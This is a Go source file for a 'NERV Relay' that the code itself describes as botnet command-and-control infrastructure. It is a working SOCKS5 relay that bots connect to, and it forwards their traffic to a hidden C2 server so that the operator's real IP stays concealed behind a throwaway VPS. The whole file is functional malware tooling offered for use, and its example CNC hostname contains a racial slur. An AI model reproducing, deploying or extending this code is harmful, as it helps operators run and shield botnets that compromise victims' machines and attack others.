package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"
	"time"
)

/*
NERV Relay Server

This relay acts as a SOCKS5 proxy that bots connect to instead of connecting directly to the CNC.
The relay forwards all traffic to the real CNC server, hiding the CNC's real IP from the bots.

Architecture:
  Bot --SOCKS5--> Relay (public, throwaway VPS) --TCP--> CNC (hidden, real C2)

Usage:
  ./relay <cnc_host> <cnc_port> [socks_port]
  
  Default SOCKS5 port: 1080
  
Example:
  ./relay goynetnigga.duckdns.org 6621 1080
  
  Or use environment variables:
  RELAY_CNC_HOST=goynetnigga.duckdns.org RELAY_CNC_PORT=6621 ./relay
*/

var (
	cncHost   string
	cncPort   string
	socksPort string = "1080"
)

func init() {
	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
	log.SetPrefix("[relay] ")
}

func main() {
	// Parse arguments
	args := os.Args[1:]

	// Check environment variables first
	cncHost = os.Getenv("RELAY_CNC_HOST")
	cncPort = os.Getenv("RELAY_CNC_PORT")

	if len(args) >= 1 {
		cncHost = args[0]
	}
	if len(args) >= 2 {
		cncPort = args[1]
	}
	if len(args) >= 3 {
		socksPort = args[2]
	}

	if cncHost == "" || cncPort == "" {
		fmt.Println("NERV Relay v1.0")
		fmt.Println("Usage: relay <cnc_host> <cnc_port> [socks_port]")
		fmt.Println("  Environment: RELAY_CNC_HOST, RELAY_CNC_PORT")
		fmt.Println("\nExample:")
		fmt.Println("  ./relay goynetnigga.duckdns.org 6621 1080")
		os.Exit(1)
	}

	log.Printf("Starting NERV Relay")
	log.Printf("  CNC target : %s:%s", cncHost, cncPort)
	log.Printf("  SOCKS5     : 0.0.0.0:%s", socksPort)
	log.Printf("  Connection : Bot -> SOCKS5(relay) -> TCP -> CNC")
	log.Printf("  NOTE: CNC IP is hidden from bots. Only the relay knows the real CNC address.")

	// Start SOCKS5 listener
	listener, err := net.Listen("tcp", "0.0.0.0:"+socksPort)
	if err != nil {
		log.Fatalf("Failed to listen on port %s: %v", socksPort, err)
	}
	defer listener.Close()

	log.Printf("SOCKS5 proxy listening on 0.0.0.0:%s", socksPort)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Accept error: %v", err)
			continue
		}
		go handleSOCKS5(conn)
	}
}

// handleSOCKS5 handles a SOCKS5 connection from a bot
func handleSOCKS5(client net.Conn) {
	defer client.Close()

	// Set a timeout for initial handshake
	client.SetDeadline(time.Now().Add(30 * time.Second))

	// Step 1: Read SOCKS5 greeting
	// Client sends: [version=0x05, num_methods, methods...]
	greeting := make([]byte, 2)
	if _, err := io.ReadFull(client, greeting); err != nil {
		log.Printf("Failed to read SOCKS5 greeting: %v", err)
		return
	}

	if greeting[0] != 0x05 {
		log.Printf("Invalid SOCKS version: 0x%02x (expected 0x05)", greeting[0])
		return
	}

	numMethods := int(greeting[1])
	if numMethods < 1 || numMethods > 255 {
		log.Printf("Invalid number of auth methods: %d", numMethods)
		return
	}

	methods := make([]byte, numMethods)
	if _, err := io.ReadFull(client, methods); err != nil {
		log.Printf("Failed to read SOCKS5 methods: %v", err)
		return
	}

	// Check if client supports no-auth (0x00)
	supportsNoAuth := false
	for _, m := range methods {
		if m == 0x00 {
			supportsNoAuth = true
			break
		}
	}

	if !supportsNoAuth {
		log.Printf("Client doesn't support no-auth method")
		// Reject with no acceptable methods
		client.Write([]byte{0x05, 0xFF})
		return
	}

	// Respond with no-auth required
	if _, err := client.Write([]byte{0x05, 0x00}); err != nil {
		log.Printf("Failed to send SOCKS5 auth response: %v", err)
		return
	}

	// Step 2: Read SOCKS5 request
	// Client sends: [version=0x05, cmd, rsv=0x00, addr_type, addr, port]
	requestHeader := make([]byte, 4)
	if _, err := io.ReadFull(client, requestHeader); err != nil {
		log.Printf("Failed to read SOCKS5 request header: %v", err)
		return
	}

	if requestHeader[0] != 0x05 {
		log.Printf("Invalid SOCKS5 request version: 0x%02x", requestHeader[0])
		return
	}

	cmd := requestHeader[1]
	if cmd != 0x01 { // Only support CONNECT
		log.Printf("Unsupported SOCKS5 command: 0x%02x (only CONNECT supported)", cmd)
		client.Write([]byte{0x05, 0x07, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}) // Command not supported
		return
	}

	addrType := requestHeader[3]

	var targetAddr string
	switch addrType {
	case 0x01: // IPv4
		ipBytes := make([]byte, 4)
		if _, err := io.ReadFull(client, ipBytes); err != nil {
			log.Printf("Failed to read IPv4 address: %v", err)
			return
		}
		targetAddr = net.IP(ipBytes).String()

	case 0x03: // Domain name
		lenByte := make([]byte, 1)
		if _, err := io.ReadFull(client, lenByte); err != nil {
			log.Printf("Failed to read domain length: %v", err)
			return
		}
		domainBytes := make([]byte, int(lenByte[0]))
		if _, err := io.ReadFull(client, domainBytes); err != nil {
			log.Printf("Failed to read domain name: %v", err)
			return
		}
		targetAddr = string(domainBytes)

	case 0x04: // IPv6
		log.Printf("IPv6 not supported")
		client.Write([]byte{0x05, 0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}) // Address type not supported
		return

	default:
		log.Printf("Unknown address type: 0x%02x", addrType)
		client.Write([]byte{0x05, 0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}

	// Read port (2 bytes, big endian)
	portBytes := make([]byte, 2)
	if _, err := io.ReadFull(client, portBytes); err != nil {
		log.Printf("Failed to read port: %v", err)
		return
	}
	targetPort := binary.BigEndian.Uint16(portBytes)

	// The bot requests to connect to the relay's own IP
	// We ignore the requested address and connect to the real CNC instead
	log.Printf("Bot requesting connect to %s:%d, forwarding to real CNC %s:%s",
		targetAddr, targetPort, cncHost, cncPort)

	// Connect to the real CNC
	cncAddr := net.JoinHostPort(cncHost, cncPort)
	cncConn, err := net.DialTimeout("tcp", cncAddr, 10*time.Second)
	if err != nil {
		log.Printf("Failed to connect to CNC %s: %v", cncAddr, err)
		client.Write([]byte{0x05, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}) // Host unreachable
		return
	}
	defer cncConn.Close()

	// Send success response to bot
	// Using the original requested address in the response
	response := []byte{0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	if addrType == 0x03 {
		response[3] = 0x03
		// For domain, we need a different response format
		domainLen := byte(len(targetAddr))
		response = append([]byte{0x05, 0x00, 0x00, 0x03, domainLen}, []byte(targetAddr)...)
		portResp := make([]byte, 2)
		binary.BigEndian.PutUint16(portResp, targetPort)
		response = append(response, portResp...)
	}
	if _, err := client.Write(response); err != nil {
		log.Printf("Failed to send SOCKS5 success response: %v", err)
		return
	}

	// Remove deadline for data transfer
	client.SetDeadline(time.Time{})

	// Log connection established
	remoteAddr := client.RemoteAddr().String()
	if idx := strings.LastIndex(remoteAddr, ":"); idx != -1 {
		remoteAddr = remoteAddr[:idx]
	}
	log.Printf("[+] Bot connected via relay: %s -> CNC %s:%s", remoteAddr, cncHost, cncPort)

	// Bidirectional copy
	done := make(chan bool, 2)

	go func() {
		io.Copy(cncConn, client)
		done <- true
	}()

	go func() {
		io.Copy(client, cncConn)
		done <- true
	}()

	<-done
	log.Printf("[-] Bot disconnected: %s", client.RemoteAddr().String())
}
